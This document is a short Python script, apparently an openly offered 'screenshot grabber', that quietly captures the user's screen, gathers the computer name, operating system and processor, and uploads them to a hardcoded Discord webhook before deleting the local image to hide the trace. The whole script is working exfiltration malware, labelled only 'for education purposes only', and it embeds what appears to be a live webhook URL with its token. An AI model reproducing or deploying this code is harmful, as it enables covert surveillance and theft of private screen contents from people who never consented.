# Import requirements
from discord_webhook import DiscordWebhook, DiscordEmbed
import pyautogui
import platform
import os

# Take a screenshot and save it
systeminfo = platform.uname()
screenshot = pyautogui.screenshot()
screenshot.save("screenshot.jpg")

# Set the webhook
webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1221162536242642984/-SkHB0oWPkm6Tugq3Zj1VcqmUjxVF75aax_2Dmsaqpyg0fnFlxQGvjnq5R_cecKlYHWk", # Enter your Discord Webhook address
                         username="ASISAMKO SCREENSHOT GRABBER") # Enter Webhook name

embed = DiscordEmbed(title="New Screenshot Grabbed 👁️",
                    color = "249cd4",
                    url="https://github.com/asisamko",)

embed.set_author(name="ASISAMKO IMAGE GRABBER V1",
                 url="https://github.com/asisamko",
                 icon_url="")

embed.add_embed_field(name="💻 Computer Name:",
                value=f"{systeminfo.node}",
                inline=True)
embed.add_embed_field(name="💾 System:",
                value=f"{systeminfo.system}",
                inline=True)
embed.add_embed_field(name="⚡ Processor:",
                value=f"{systeminfo.processor}",
                inline=False)
embed.add_embed_field(name="",
                value="",
                inline=False)
embed.add_embed_field(name="",
                value="**SCREENSHOT CAPTURED  **📸",
                inline=True)

with open('screenshot.jpg', 'rb') as file:
    embed.set_image(url='attachment://screenshot.jpg')
    webhook.add_file(file=file.read(), filename='screenshot.jpg')

embed.set_footer(text=f"For education purposes only!")
embed.set_timestamp()

webhook.add_embed(embed)
response = webhook.execute()

# Remove the saved screenshot file
os.remove("screenshot.jpg")